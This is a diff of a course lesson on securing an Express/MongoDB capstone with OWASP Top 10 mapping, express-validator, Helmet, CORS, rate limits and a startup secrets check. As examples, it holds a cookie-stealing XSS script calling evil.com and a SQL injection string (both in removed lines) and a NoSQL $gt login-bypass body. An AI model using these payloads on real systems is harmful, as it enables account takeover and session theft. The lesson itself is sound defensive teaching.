@@ -2,9 +2,9 @@
 editorial: true
 title: Barrier Magic
 subtitle: OWASP, Input Validation, and Secrets Management
-hook: "A threat model, validated server boundaries, and a secrets-handling checklist. Identify untrusted input and protected resources."
+hook: "The capstone gets its first line of code today, copied from the hall you already trust, and then it gets a barrier: every body validated into a shape you chose, headers Helmet sets for you, a limiter on the login door, and a process that refuses to start without its secrets."
 read: 60
-artifact: "A threat model, validated server boundaries, and a secrets-handling checklist"
+artifact: "A capstone API and client scaffolded from the hall's auth pattern, hardened with validation, Helmet, CORS, and rate limits, plus docs/threat-model.md"
 diagrams:
   - fig1-model
   - fig2-diagnosis
@@ -12,458 +12,541 @@ diagrams:
 docs:
   - https://owasp.org/Top10/2025/
   - https://cheatsheetseries.owasp.org/cheatsheets/Input_Validation_Cheat_Sheet.html
+  - https://express-validator.github.io/docs/
+  - https://helmetjs.github.io/
+  - https://express-rate-limit.mintlify.app/
+  - https://nodejs.org/api/cli.html#--env-fileconfig
 say:
-  - "Boundary: Identify untrusted input and protected resources."
-  - "Control: Validate, authorize, and limit each operation."
-  - "Evidence: Test abuse cases and record useful security events."
+  - "Validation builds a trusted shape; it does not clean a dirty one."
+  - "Sanitizing a string and authorizing an operation are two different checks, and you need both."
+  - "A secret that was ever committed is public; rotate it, then delete it."
 ---
 
 ## The hook
 
-You know that moment in every isekai where the hero builds their base, recruits their party, establishes their territory, and then the demon lord's army shows up and they realize they forgot to put up a barrier? That is what happens to startups that skip security. Someone built a beautiful app, got users, raised money, and then a script kiddie with SQLMap took it all down because they forgot to sanitize an input field. We are not going to be that founder.
+Nine sessions of documents sit in `~/projects/<capstone-name>/docs`: `research.md` with the interviews and the empathy map, `user-stories.md`, `sprint-plan.md`, `product-spec.md`, and last session's `system-design.md`. The folder has no `package.json`. Today that changes. You scaffold the capstone's API and client, and you do not invent a login from scratch. You copy the user model, `register`, `login`, and `requireUser` from `~/projects/hall-api`, because the hall is the code you have already proven with three accounts and a 403.
 
-This is the session where your defense stat goes through the roof. We are going to study the OWASP Top 10, the ten most common attack vectors on the internet, and learn how every single one of them works. Then we are going to armor your app with input validation, sanitization, security headers, CORS, rate limiting, and proper secrets management. Every kingdom needs a barrier. By the end of today, yours will be up and running.
+Then you put the barrier up before there is anything behind it worth stealing. The order matters. A route that accepts `{ "role": "admin" }` on day one is still accepting it on the day you have real users, unless the validation chain was there first. By the end of the session the capstone answers `POST /api/register` with a 201 that contains only the fields you chose, answers a NoSQL operator with a 400, sends Helmet's headers on every response, returns 429 on the eleventh login attempt, and exits with one FATAL line when `JWT_SECRET` is missing.
 
-Here is the hard truth: breaches kill startups. A single data leak can destroy trust, trigger lawsuits, and burn your reputation before you even get to Series A. The average breach costs $4.45 million, but for startups it is existential. Security is not a checkbox. It is a competitive advantage. Today you learn to think like an attacker so you can defend like a champion.
-
----
-
-### What the Run button does
-
-The Run button on this page runs a small model in your browser. It does not install a language, open a database, start a server, charge a card, call an AI provider, or move money. The longer walkthroughs are files and commands for a project on your own machine. Install those tools yourself from the official docs linked on this page, keep secrets in your own environment, and use made-up data in the exercises.
-
-A green checkpoint means this page's model behaved the way the checkpoint claims. It does not mean a service you have not started is working. If a tool is missing, keep designing, write down the result you expect, and mark that check as not run. A screenshot of a result you did not produce is not a result.
+> *The hall taught you to check the token. The barrier is everything the token does not check.*
 
 ## The idea
 
-### Evaluate and mitigate common web application security vulnerabilities
-You will assess applications against the OWASP Top 10 vulnerability categories and implement server-side defenses including input validation, sanitization, security headers, CORS configuration, and rate limiting to harden Express.js applications against real-world attack vectors.
+The [OWASP Top 10:2025](https://owasp.org/Top10/2025/) is an awareness list, not a certificate. Ten categories, ordered by how often they turn up in real breaches. You read it once with the capstone open and ask of each category: where in my API could this happen, and which line prevents it. The answers are the threat model. Most of them are short. Some of them are "nowhere yet, because the feature does not exist," and that is a legitimate entry as long as you come back when the feature arrives in 10-2 and 10-3.
 
-**You will:**
-- Identify the OWASP Top 10 vulnerability categories and describe how each one exploits web applications
-- Implement server-side input validation and sanitization using express-validator and DOMPurify
-- Configure Helmet.js security headers, CORS whitelisting, and express-rate-limit middleware
-- Design a centralized secrets management system with environment variable validation
+Here is the list, with the capstone's answer next to each item. A01 Broken Access Control: a route reads `req.params.id` and returns the document without checking `req.userId` owns it. The hall's inbox already shows the fix, which is a filter with the token's id in it. A02 Security Misconfiguration: debug output in production, a wildcard CORS origin, a stack trace in a JSON error. A03 Software Supply Chain Failures: a dependency with a known hole, or a lockfile you never read. A04 Cryptographic Failures: a password stored as text, a token signed with the string `secret`. A05 Injection: a request body that is an operator instead of a string, reaching `User.findOne`. A06 Insecure Design: a flow that lets anyone reach the paid feature by typing its URL. A07 Authentication Failures: unlimited login attempts, tokens that never expire. A08 Software or Data Integrity Failures: a webhook you believe without checking its signature, which is next session. A09 Security Logging and Alerting Failures: a failed login that leaves no line anywhere. A10 Mishandling of Exceptional Conditions: a thrown error that becomes a hung request or a leaked message.
 
-**You will be able to:**
-- Explain injection attacks (SQL, NoSQL, command), XSS (stored, reflected, DOM-based), and CSRF with concrete code examples
-- Write express-validator chains that validate, sanitize, and escape user input across all POST/PUT routes
-- Configure Helmet.js with custom Content Security Policy directives and CORS with origin whitelisting
-- Build a config module that validates required environment variables at startup and fails fast on missing secrets
+The old names you will see in older posts, Broken Authentication, XSS, CSRF, SSRF, are still real attacks. In the 2025 list XSS lives under Injection, SSRF lives under Broken Access Control, and the authentication category was renamed. The [side quest on A01](/security/owasp/a01-broken-access-control/) and [the one on A05](/security/owasp/a05-injection/) are the two most likely to bite a JSON API, and the [quick reference](/security/web-vulns-quick-reference/) is the glossary for the rest.
 
-**Why Security Is a Founder Skill**
-- Open with a real breach story: the 2023 MOVEit breach affected 60+ million people from a single SQL injection vulnerability
-- At a startup, YOU are the security team. There is no separate department.
-- Cost of breaches: average $4.45M per breach (IBM 2023), but for startups it is existential
-- Frame security as a competitive advantage, not just a compliance requirement
+### Boundaries first, then controls
 
-**The OWASP Top 10 - A Hacker's Playbook**
+Start by listing what the capstone must protect: user records, password hashes, the JWT secret, and from next session on, payment state and a provider key. Then name where untrusted input crosses into an operation. The JSON body, the query string, the URL parameters, the `Authorization` header, and later a webhook body and a model's reply. Each of those is a boundary. A boundary has an ordinary request and an abuse request, and the server has to tell them apart without help from the screen. A user editing their own profile is ordinary. The same user changing the id in the URL to someone else's is abuse. Hiding the edit button in React does nothing to a `curl` command.
 
-**Injection Attacks**
-- SQL Injection: what it is, how it works
-```sql
--- What the developer intended:
-SELECT * FROM users WHERE username = 'alice' AND password = 'hunter2';
+Draw one request through the capstone and mark the boundary it crosses. `POST /api/register` carries a body. The body is bytes until `express.json()` parses it. After parsing it is an object with whatever keys the client chose. That object is not your data. It is a proposal. Validation is the step that turns a proposal into a shape you decided on, and that is the sentence to keep: validation builds a trusted shape, it does not clean a dirty one.
 
--- What the attacker sends as username:
-' OR '1'='1' --
+### Validation creates a trusted shape
 
--- What the database actually runs:
-SELECT * FROM users WHERE username = '' OR '1'='1' --' AND password = '';
--- Returns ALL users. Game over.
-```
-- NoSQL Injection in MongoDB:
-```javascript
-// Vulnerable login route
-app.post('/login', async (req, res) => {
-  const user = await User.findOne({
-    username: req.body.username,
-    password: req.body.password
-  });
-  // Attacker sends: { "username": {"$gt": ""}, "password": {"$gt": ""} }
-  // This matches ANY user with a non-empty username and password
-});
-```
-- Command Injection: what happens when you pass user input to shell commands
-- Key takeaway: NEVER trust user input. EVER.
+[express-validator](https://express-validator.github.io/docs/) is a set of middleware that checks and transforms fields on `req`. You write a chain per field: `body('email').isString().trim().toLowerCase().isEmail()`. Each call adds a rule. `validationResult(req)` collects the failures, and `matchedData(req)` returns an object holding only the fields that had a chain. That second function is the whole trick. If the client sends `role: 'admin'`, there is no chain for `role`, so `matchedData` does not return it, so it never reaches `User.create`. You did not write code to strip `role`. You wrote code that only accepts `name`, `email`, and `password`, and everything else fell off.
 
-**Broken Authentication**
-- Weak passwords, credential stuffing, session hijacking
-- Why "admin/admin" is still the most common default login
-- Session fixation vs session hijacking
-- Best practices: bcrypt with high salt rounds, HTTP-only cookies, secure session configuration
-```javascript
-// BAD: storing passwords in plain text
-const unsafeUser = new User({ password: req.body.password }); // NO NO NO
+Compare that with the habit of passing `req.body` straight into `User.create(req.body)`. Mongoose drops unknown keys that are not in the schema, so you might feel safe. Then one day you add `role` to the schema for an admin screen, and the register route starts accepting it the same afternoon. The chain is the place that says what register accepts, and it does not change because the schema grew.
 
-// GOOD: hashing with bcrypt (you already learned this in Unit 4)
-const salt = await bcrypt.genSalt(12);
-const hash = await bcrypt.hash(req.body.password, salt);
-const user = new User({ password: hash });
+Validation and output encoding are different jobs. A `name` of `<script>` is valid text; it is not valid HTML. The capstone's client renders text through React, which escapes by default, so the API does not need to mangle the name on the way in. If a later feature needs rich HTML, that is the moment to add a maintained sanitizer with an allowlist, not a regular expression you wrote at midnight.
+
+### The operator that is not a string
+
+A MongoDB query is an object, and so is a JSON body. That is the whole of NoSQL injection. The hall's login did `User.findOne({ email })` with `email` from the body. Send this body and read it as the query it becomes:
+
+```json
+{ "email": { "$gt": "" }, "password": { "$gt": "" } }
 ```
 
-**Cross-Site Scripting / XSS**
-- Stored XSS: attacker saves malicious script in your database, every user who views it gets hit
-- Reflected XSS: malicious script in a URL parameter gets rendered on the page
-```jsx
-// Stored XSS example: user submits this as their "bio"
-const maliciousBio = '<script>fetch("https://evil.com/steal?cookie="+document.cookie)</script>';
+`{ email: { $gt: '' } }` matches every user whose email is greater than the empty string, which is every user. The hall was saved by `bcrypt.compare`, which needs a real string, and by the schema's string cast on the way in. Do not lean on that. Two defences are cheaper. The chain's `isString()` rejects an object before the handler runs. A small middleware that walks the body and refuses any key starting with `$` or containing a `.` rejects the shape itself. You will write both. The older `express-mongo-sanitize` package does the second job by assigning to `req.query`, and Express 5 made `req.query` a read-only getter, so write the twelve lines yourself.
 
-// If you render this without sanitizing:
-res.send(`<div class="bio">${user.bio}</div>`);
-// Every visitor to this profile just had their cookies stolen
-```
-- DOM-based XSS: client-side JavaScript manipulates the DOM unsafely
-- Prevention: output encoding, Content Security Policy headers, never use innerHTML with user data
+### Headers, origins, and the door you throttle
 
-**Cross-Site Request Forgery / CSRF**
-- Trick a logged-in user into making a request they did not intend
-- Example: a hidden form on a malicious site submits a POST to your banking app
-- Prevention: CSRF tokens, SameSite cookies, checking Origin/Referer headers
+[Helmet](https://helmetjs.github.io/) is one middleware that sets a bundle of response headers: `Content-Security-Policy`, `X-Content-Type-Options: nosniff`, `Strict-Transport-Security`, `Referrer-Policy`, and a few more. `app.use(helmet())` with no options is the right call for an API that serves JSON. The CSP it sets on a JSON response does not govern your React page, because the page comes from Vite in development and from a static host in production. The page's CSP belongs to whoever serves the page. Do not spend the evening tuning `scriptSrc` on an API.
 
-**Security Misconfiguration**
-- Default credentials left in place
-- Unnecessary features enabled (directory listing, debug mode in production)
-- Missing security headers
-- Exposed error messages that reveal stack traces
-- Running outdated dependencies with known vulnerabilities (run `npm audit` regularly)
+CORS you already know from 4-11. The origin is `PAGE_ORIGIN` from the environment, a single string, not `*`. A wildcard with credentials is a misconfiguration the browser will refuse anyway, and a wildcard without credentials means any page on the internet can call your API with a stolen token in a header. One origin in development, one in production, both from the environment.
 
-**Other OWASP Hits: Quick Overview**
-- Broken Access Control: users accessing resources they should not
-- Cryptographic Failures: weak encryption, exposed secrets
-- Insecure Design: flaws in the architecture itself
-- Server-Side Request Forgery (SSRF): tricking your server into making requests to internal resources
-- Software and Data Integrity Failures: not verifying updates, CI/CD poisoning
+[express-rate-limit](https://express-rate-limit.mintlify.app/) counts requests per key inside a window and answers 429 once the count passes `limit`. The option is `limit`. Older tutorials write `max`, which was the name in version 6, and current versions accept it only as a deprecated alias. Two limiters are enough today: a general one on `/api` with a generous number, and a strict one on `/api/login` and `/api/register` with a number you can hit by hand in a loop. The login limiter is the control for A07. Ten attempts in fifteen minutes is a wall for a script and not a wall for a person who forgot a password twice.
 
-**Sidebar: OAuth and "Sign in with Google"**
+### Secrets, and the process that refuses to start
 
-Your capstone uses JWT auth that you built in Unit 4. But you have clicked "Sign in with Google/GitHub/Apple" a thousand times, so you should know what it is: **OAuth 2.0**, a protocol for *delegated* authentication. Instead of your app storing a password, you outsource identity-checking to a provider the user already trusts.
+The capstone reads `.env` the way every project since 4-5 has: `node --env-file=.env server.js`. There is no package for it. The `dotenv` package you will see in other codebases does the same job from inside the program, with `require('dotenv').config()` as the first line; it is the library alternative, and you only need it when you cannot control the command line, which you can. What you add today is a check that runs before `app.listen`: a short list of required names, a loop that prints `FATAL: missing environment variable X` and exits with code 1 if one is absent. A process that starts without `JWT_SECRET` and signs tokens with `undefined` is a worse outcome than a process that refuses to start.
 
-The flow in one breath: your app redirects the user to the provider → the user approves → the provider redirects back with a one-time code → your server exchanges that code (plus your app's client secret) for a token → the token proves who the user is, and from there you issue your own session or JWT exactly as before.
+The secret-handling rules fit on a card. `.env` is in `.gitignore` before the first commit, and `git check-ignore api/.env` proves it. A `.env.example` with names and empty values is the file that belongs in the repo. A secret that was ever committed is public, even if the next commit deleted it, because history keeps it; rotate first, then clean. Secrets never go in a log line and never in a URL. The bearer token lives in `sessionStorage` and in the `Authorization` header, which is a deliberate choice you record, not a cookie you forgot to set.
 
-Founder trade-offs:
-- **Pros:** no passwords to store or leak (a whole OWASP category removed), lower signup friction, users trust the button
-- **Cons:** you depend on a third party for logins, setup requires registering your app with each provider, and account-linking edge cases (same email, different providers) get messy
-- **Practical path:** libraries like Passport.js or hosted services (Auth0, Clerk, Firebase Auth) handle the dance for you. Do not hand-roll the OAuth exchange for production — this is a "use the battle-tested library" zone, same as password hashing.
-
-**Common Misconceptions:**
-- "I use a framework so I am safe." Frameworks help but do not cover everything. You must still validate input, manage secrets, and configure headers.
-- "Security is something you do at the end." Security must be baked in from the start. Retrofitting is harder and more expensive.
-- "Only big companies get hacked." Startups are often easier targets because they skip security practices.
-- "HTTPS means my app is secure." HTTPS encrypts transit. It does not protect against injection, XSS, or broken authentication.
-
----
+Here is the napkin version. Untrusted input crosses a boundary. A chain turns it into a trusted shape or a 400. A middleware rejects operator keys. Helmet and CORS set the envelope. A limiter guards the door that can be guessed at. The process checks its secrets before it listens. Authorization is still a separate check inside every handler, because none of the above knows who owns what.
 
 ![](diagram:session-10-1/fig1-model)
 
-### Start with assets and trust boundaries
-
-List what the application must protect: user records, credentials, payment entitlements, provider keys, and service availability. Then identify where untrusted input crosses into an operation. A form, URL parameter, webhook, uploaded file, and model response are all possible boundaries. Security work becomes concrete when you can name the asset, actor, operation, and failure you are trying to prevent.
-
-Draw one ordinary request and one abuse request through the same route. A user editing their own profile is ordinary. The same user changing the identifier to another account is an abuse case. The server must enforce the distinction. Hiding the edit button or validating the form in React does not protect a directly invoked endpoint. Use synthetic accounts to demonstrate the boundary in a controlled test environment.
-
-### Validation should create a trusted shape
-
-Validate type, length, range, format, and allowed values according to the operation. Construct a new object containing only accepted fields. Avoid passing a raw request body directly into a database update. Unknown properties such as role or owner can become a privilege escalation if a generic update accepts them. Return clear field-level errors without exposing internal stack traces.
-
-Input validation and output encoding solve different problems. A value may be valid domain data and still need safe rendering in an HTML context. Prefer framework text rendering over constructing HTML strings. If rich HTML is a product requirement, use a maintained sanitizer with a deliberate allowlist and test the allowed behavior. Do not invent a regular expression that claims to remove every dangerous HTML pattern.
-
-### Dependencies and configuration are part of the system
-
-An application can have careful route code and still expose a database through its network configuration. Review debug modes, public directories, error responses, and default accounts. Keep the database private, apply least privilege to service credentials, and avoid shipping development secrets. A configuration review should use actual deployed settings with values redacted, not only an ideal example file.
-
-Dependency audit output is a starting point for investigation. Determine whether the vulnerable path is used, whether a fixed version exists, and whether the update changes behavior. Do not apply a forceful automatic upgrade and assume the application remains correct. Review the lockfile diff and run the checks relevant to the affected package. Record unresolved findings with their context and mitigation.
-
-### Logging must help without becoming another leak
-
-Record authentication failures, denied privileged operations, and unexpected service errors with a request identifier. Avoid passwords, tokens, full payment data, and unnecessary personal content. A log line should let an operator connect an incident to a route and time without exposing the secret that caused it. Access to logs needs its own permissions and retention policy.
-
-The OWASP Top 10:2025 is the awareness reference for this unit; it includes software supply chain failures and mishandling of exceptional conditions alongside access control, injection, and other risks. Use the individual library pages for deeper exercises. The list helps organize questions, but checking ten labels is not a proof that an application is secure. [OWASP Top 10:2025](https://owasp.org/Top10/2025/).
-
 ## The demonstration
 
-**BREAK (45-50 min / 0:55-1:05)**
+Stop any server from Unit 9 with Ctrl-C in its terminal. Nothing else should be on port 3000. Mongo is running locally on 27017 from 4-4.
 
-**Live Code: Input Validation and Sanitization (50-75 min / 1:05-1:40)**
+The capstone repo already exists from 8-1, with `docs/` inside it. Scaffold the two halves beside the docs. Replace `<capstone-name>` with your folder's name in every command.
 
-Install and configure express-validator:
 ```bash
-npm install express-validator
+cd ~/projects/<capstone-name>
+mkdir -p api/models api/routes api/middleware
+cd api && npm init -y
+npm install express mongoose bcrypt jsonwebtoken cors helmet express-rate-limit express-validator
+cd ..
+npm create vite@latest client -- --template react
+cd client && npm install && cd ..
+printf 'node_modules/\n.env\ndist/\n' >> .gitignore
 ```
 
-Build a validated registration route step by step:
-```javascript
-import { body, validationResult } from 'express-validator';
+The repo root `.gitignore` covers both halves: `node_modules/` and `.env` match at any depth. Run `git check-ignore api/.env` after you create the file. It prints the path back when the rule works, and prints nothing when it does not.
 
-// Validation middleware chain
-const registerValidation = [
-  body('username')
-    .trim()
-    .isLength({ min: 3, max: 30 })
-    .withMessage('Username must be between 3 and 30 characters')
-    .isAlphanumeric()
-    .withMessage('Username must contain only letters and numbers')
-    .escape(),
+Now the four pieces from the hall. Open `~/projects/hall-api` beside the capstone. If you finished 9-5's conversion, the hall's code is TypeScript under `src/`; the JavaScript below is what those files are without the type annotations, so copy the shape and drop the types as you paste. Copy the `userSchema` and the `User` model into `api/models/user.js`. Copy `requireUser` into `api/middleware/require-user.js`. Copy `register` and `login` into `api/routes/auth.js`. Rename three things as you go: the audience `'guild'` becomes `'capstone'`, the port `4100` becomes `3000`, and the database `guildhall` becomes `<capstone-name>`.
 
-  body('email')
-    .trim()
-    .isEmail()
-    .withMessage('Please provide a valid email address')
-    .normalizeEmail(),
+`api/models/user.js` is the hall's schema with timestamps:
 
-  body('password')
-    .isLength({ min: 8 })
-    .withMessage('Password must be at least 8 characters')
-    .matches(/[A-Z]/)
-    .withMessage('Password must contain at least one uppercase letter')
-    .matches(/[0-9]/)
-    .withMessage('Password must contain at least one number')
-    .matches(/[!@#$%^&*]/)
-    .withMessage('Password must contain at least one special character'),
+```js
+const mongoose = require('mongoose');
 
-  body('bio')
-    .optional()
-    .trim()
-    .isLength({ max: 500 })
-    .withMessage('Bio must be 500 characters or less')
-    .escape() // Prevents stored XSS
-];
+const userSchema = new mongoose.Schema(
+  {
+    name: { type: String, required: true, trim: true },
+    email: { type: String, required: true, unique: true, lowercase: true, trim: true },
+    passwordHash: { type: String, required: true }
+  },
+  { timestamps: true }
+);
 
-// Route with validation
-app.post('/api/register', registerValidation, async (req, res) => {
-  // Check for validation errors
-  const errors = validationResult(req);
-  if (!errors.isEmpty()) {
-    return res.status(400).json({
-      success: false,
-      errors: errors.array().map(err => ({
-        field: err.path,
-        message: err.msg
-      }))
-    });
-  }
+const User = mongoose.model('User', userSchema);
 
-  // If we get here, input is clean
-  const { username, email, password, bio } = req.body;
-  // ... create user with hashed password
-});
+module.exports = { User };
 ```
 
-Sanitizing HTML input with DOMPurify (for rich text fields):
-```bash
-npm install isomorphic-dompurify
-```
-```javascript
-import DOMPurify from 'isomorphic-dompurify';
+`api/config.js` is new. It runs before anything listens.
 
-// For fields where you WANT some HTML (like a blog post body)
-const cleanHTML = DOMPurify.sanitize(req.body.content, {
-  ALLOWED_TAGS: ['b', 'i', 'em', 'strong', 'p', 'br', 'ul', 'ol', 'li', 'a'],
-  ALLOWED_ATTR: ['href', 'target']
-});
-// Strips <script>, <iframe>, event handlers, etc.
-```
+```js
+const required = ['MONGODB_URI', 'JWT_SECRET', 'PAGE_ORIGIN'];
 
-Build reusable validation middleware for common patterns:
-```javascript
-// middleware/validate.js
-export const validateRequest = (req, res, next) => {
-  const errors = validationResult(req);
-  if (!errors.isEmpty()) {
-    return res.status(400).json({
-      success: false,
-      errors: errors.array().map(err => ({
-        field: err.path,
-        message: err.msg
-      }))
-    });
-  }
-  next();
-};
-
-// Now use it cleanly in routes:
-router.post('/register', registerValidation, validateRequest, registerController);
-router.post('/login', loginValidation, validateRequest, loginController);
-```
-
-**Live Code: Secrets, CORS, Helmet, and Rate Limiting (75-90 min / 2:10-2:40)**
-
-**Secrets Management**
-```bash
-npm install dotenv
-```
-```dotenv
-# .env file (NEVER commit this)
-PORT=3000
-MONGODB_URI=mongodb+srv://username:password@cluster.mongodb.net/mydb
-JWT_SECRET=your-super-secret-jwt-key-change-this-in-production
-STRIPE_SECRET_KEY=sk_test_abc123
-CLAUDE_API_KEY=sk-ant-abc123
-
-# .gitignore (MUST include .env)
-node_modules/
-.env
-.env.local
-.env.production
-```
-```javascript
-// config/index.js - centralized config with validation
-import dotenv from 'dotenv';
-dotenv.config();
-
-const requiredVars = ['MONGODB_URI', 'JWT_SECRET', 'STRIPE_SECRET_KEY'];
-
-for (const varName of requiredVars) {
-  if (!process.env[varName]) {
-    console.error(`FATAL: Missing required environment variable: ${varName}`);
+for (const name of required) {
+  if (!process.env[name]) {
+    console.error('FATAL: missing environment variable ' + name);
     process.exit(1);
   }
 }
 
-export const config = {
-  port: process.env.PORT || 3000,
+if (process.env.JWT_SECRET.length < 32) {
+  console.error('FATAL: JWT_SECRET is too short; generate one with: openssl rand -hex 32');
+  process.exit(1);
+}
+
+module.exports = {
+  port: Number(process.env.PORT) || 3000,
   mongoUri: process.env.MONGODB_URI,
   jwtSecret: process.env.JWT_SECRET,
-  stripeSecretKey: process.env.STRIPE_SECRET_KEY,
-  claudeApiKey: process.env.CLAUDE_API_KEY,
+  pageOrigin: process.env.PAGE_ORIGIN,
   nodeEnv: process.env.NODE_ENV || 'development'
 };
 ```
-- Secret rotation: changing keys periodically, having a plan for when keys are compromised
-- Never log secrets. Add a startup check that warns if secrets look like defaults.
 
-**CORS Configuration**
-```bash
-npm install cors
-```
-```javascript
-import cors from 'cors';
+`api/middleware/require-user.js` is the hall's middleware with the new audience:
 
-// BAD: allow everything (fine for development, terrible for production)
-app.use(cors());
+```js
+const jwt = require('jsonwebtoken');
+const config = require('../config');
 
-// GOOD: whitelist specific origins
-const allowedOrigins = [
-  'https://yourdomain.com',
-  'https://www.yourdomain.com'
-];
-
-if (process.env.NODE_ENV === 'development') {
-  allowedOrigins.push('http://localhost:5173'); // Vite dev server
+function requireUser(req, res, next) {
+  const header = req.get('authorization') || '';
+  const parts = header.split(' ');
+  if (parts.length !== 2 || parts[0] !== 'Bearer' || parts[1] === '') {
+    return res.status(401).json({ error: 'missing token' });
+  }
+  try {
+    const payload = jwt.verify(parts[1], config.jwtSecret, { audience: 'capstone' });
+    if (!payload || !payload.sub) {
+      return res.status(401).json({ error: 'bad token' });
+    }
+    req.userId = payload.sub;
+    return next();
+  } catch (err) {
+    return res.status(401).json({ error: 'bad token' });
+  }
 }
 
-app.use(cors({
-  origin: (origin, callback) => {
-    // Allow requests with no origin (mobile apps, curl, Postman)
-    if (!origin) return callback(null, true);
-    if (allowedOrigins.includes(origin)) {
-      return callback(null, true);
-    }
-    return callback(new Error('Not allowed by CORS'));
-  },
-  credentials: true, // Allow cookies
-  methods: ['GET', 'POST', 'PUT', 'DELETE', 'PATCH'],
-  allowedHeaders: ['Content-Type', 'Authorization']
-}));
+module.exports = { requireUser };
 ```
 
-**Helmet.js Security Headers**
-```bash
-npm install helmet
-```
-```javascript
-import helmet from 'helmet';
+`req.userId` is the name every later route reads. Not `req.user.userId`, not `req.user.id`. One name, set in one place.
 
-// One line. Massive security boost.
-app.use(helmet());
+`api/middleware/validate.js` holds the two small pieces the chains need:
 
-// What Helmet sets by default:
-// Content-Security-Policy: restricts where resources can load from
-// X-Content-Type-Options: nosniff (prevents MIME type sniffing)
-// X-Frame-Options: SAMEORIGIN (prevents clickjacking)
-// X-XSS-Protection: 0 (modern CSP is better, disables legacy filter)
-// Strict-Transport-Security: forces HTTPS
-// And more...
+```js
+const { validationResult } = require('express-validator');
 
-// Customize if needed (e.g., if you use inline scripts or CDN resources):
-app.use(helmet({
-  contentSecurityPolicy: {
-    directives: {
-      defaultSrc: ["'self'"],
-      scriptSrc: ["'self'", "https://js.stripe.com"],
-      styleSrc: ["'self'", "'unsafe-inline'"], // Sometimes needed for CSS-in-JS
-      imgSrc: ["'self'", "data:", "https:"],
-      connectSrc: ["'self'", "https://api.stripe.com"],
-      frameSrc: ["https://js.stripe.com"],
-    }
+function validateRequest(req, res, next) {
+  const errors = validationResult(req);
+  if (!errors.isEmpty()) {
+    return res.status(400).json({
+      error: 'invalid input',
+      fields: errors.array().map((e) => ({ field: e.path, message: e.msg }))
+    });
   }
-}));
+  next();
+}
+
+function hasOperatorKey(value) {
+  if (Array.isArray(value)) return value.some(hasOperatorKey);
+  if (value && typeof value === 'object') {
+    return Object.keys(value).some(
+      (key) => key.startsWith('$') || key.includes('.') || hasOperatorKey(value[key])
+    );
+  }
+  return false;
+}
+
+function rejectOperators(req, res, next) {
+  if (hasOperatorKey(req.body) || hasOperatorKey(req.query)) {
+    return res.status(400).json({ error: 'invalid input' });
+  }
+  next();
+}
+
+module.exports = { validateRequest, rejectOperators };
 ```
 
-**Rate Limiting**
-```bash
-npm install express-rate-limit
-```
-```javascript
-import rateLimit from 'express-rate-limit';
+`api/routes/auth.js` is the hall's two handlers with chains in front of them and `matchedData` instead of `req.body`:
 
-// General rate limiter: 100 requests per 15 minutes per IP
-const generalLimiter = rateLimit({
-  windowMs: 15 * 60 * 1000, // 15 minutes
-  max: 100,
-  message: {
-    success: false,
-    error: 'Too many requests. Please try again later.'
-  },
-  standardHeaders: true, // Return rate limit info in headers
-  legacyHeaders: false
+```js
+const express = require('express');
+const bcrypt = require('bcrypt');
+const jwt = require('jsonwebtoken');
+const { body, matchedData } = require('express-validator');
+const { User } = require('../models/user');
+const { validateRequest } = require('../middleware/validate');
+const { requireUser } = require('../middleware/require-user');
+const config = require('../config');
+
+const router = express.Router();
+
+const registerRules = [
+  body('name').isString().trim().isLength({ min: 1, max: 60 }).withMessage('name is 1 to 60 characters'),
+  body('email').isString().trim().toLowerCase().isEmail().withMessage('email must be an address'),
+  body('password').isString().isLength({ min: 8, max: 200 }).withMessage('password is at least 8 characters')
+];
+
+const loginRules = [
+  body('email').isString().trim().toLowerCase().isEmail().withMessage('email must be an address'),
+  body('password').isString().notEmpty().withMessage('password is required')
+];
+
+function signToken(user) {
+  return jwt.sign({ sub: String(user._id) }, config.jwtSecret, { expiresIn: '2h', audience: 'capstone' });
+}
+
+router.post('/register', registerRules, validateRequest, async (req, res) => {
+  const { name, email, password } = matchedData(req);
+  const passwordHash = await bcrypt.hash(password, 12);
+  try {
+    const user = await User.create({ name, email, passwordHash });
+    res.status(201).json({ id: user._id, name: user.name, email: user.email });
+  } catch (err) {
+    if (err.code === 11000) return res.status(409).json({ error: 'email already registered' });
+    throw err;
+  }
 });
 
-// Strict limiter for auth routes: 5 attempts per 15 minutes
+router.post('/login', loginRules, validateRequest, async (req, res) => {
+  const { email, password } = matchedData(req);
+  const user = await User.findOne({ email });
+  const ok = user ? await bcrypt.compare(password, user.passwordHash) : false;
+  if (!ok) return res.status(401).json({ error: 'wrong email or password' });
+  res.json({ token: signToken(user), id: user._id, name: user.name, email: user.email });
+});
+
+router.get('/me', requireUser, async (req, res) => {
+  const user = await User.findById(req.userId).select('name email');
+  if (!user) return res.status(401).json({ error: 'bad token' });
+  res.json({ id: user._id, name: user.name, email: user.email });
+});
+
+module.exports = { router };
+```
+
+`api/app.js` is the stack, in the order that is the program. It exports the app the way the hall did after Unit 7, so tests can import it without listening.
+
+```js
+const express = require('express');
+const helmet = require('helmet');
+const cors = require('cors');
+const { rateLimit } = require('express-rate-limit');
+const config = require('./config');
+const { rejectOperators } = require('./middleware/validate');
+const auth = require('./routes/auth');
+
+const app = express();
+
+app.use(helmet());
+app.use(cors({ origin: config.pageOrigin }));
+app.use((req, res, next) => {
+  console.log(req.method + ' ' + req.originalUrl);
+  next();
+});
+
+const apiLimiter = rateLimit({
+  windowMs: 15 * 60 * 1000,
+  limit: 100,
+  standardHeaders: true,
+  legacyHeaders: false,
+  message: { error: 'too many requests' }
+});
+
 const authLimiter = rateLimit({
   windowMs: 15 * 60 * 1000,
-  max: 5,
-  message: {
-    success: false,
-    error: 'Too many login attempts. Please try again in 15 minutes.'
-  }
+  limit: 10,
+  standardHeaders: true,
+  legacyHeaders: false,
+  message: { error: 'too many attempts, wait 15 minutes' }
 });
 
-// API limiter for expensive operations
-const apiLimiter = rateLimit({
-  windowMs: 60 * 1000, // 1 minute
-  max: 10,
-  message: {
-    success: false,
-    error: 'Rate limit exceeded. Please slow down.'
-  }
+app.use('/api', apiLimiter);
+app.use('/api/login', authLimiter);
+app.use('/api/register', authLimiter);
+
+app.use(express.json({ limit: '10kb' }));
+app.use(rejectOperators);
+
+app.get('/api/health', (req, res) => {
+  res.json({ ok: true });
 });
 
-// Apply them
-app.use('/api/', generalLimiter);
-app.use('/api/auth/login', authLimiter);
-app.use('/api/auth/register', authLimiter);
-app.use('/api/ai/', apiLimiter); // LLM routes are expensive
+app.use('/api', auth.router);
+
+app.use((req, res) => {
+  res.status(404).json({ error: 'no such path' });
+});
+
+app.use((err, req, res, next) => {
+  if (res.headersSent) return next(err);
